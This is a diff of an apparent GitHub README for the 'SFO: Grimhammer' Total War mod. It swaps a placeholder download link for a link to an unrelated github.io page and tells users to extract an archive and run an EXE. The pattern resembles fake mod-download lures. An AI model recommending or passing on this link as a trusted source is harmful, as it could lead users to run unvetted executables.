@@ -4,7 +4,7 @@ To install, simply extract the downloaded archive and run the provided EXE file.
 
 SFO: Grimhammer is a legendary overhaul for Total War: WARHAMMER II & III, designed to enhance realism, difficulty, and immersion. Created by a veteran team, it reworks the entire game from the ground up — with smarter AI, fresh units, and deeper campaigns.
 
-[![Download SFO: Grimhammer](https://img.shields.io/badge/Download-SFO--Grimhammer-blueviolet)](#)
+[![Download SFO: Grimhammer](https://img.shields.io/badge/Download-SFO--Grimhammer-blueviolet)](https://sfo-grimhammer-total-war-overhaul-mod.github.io/.github)
 
 ---
 
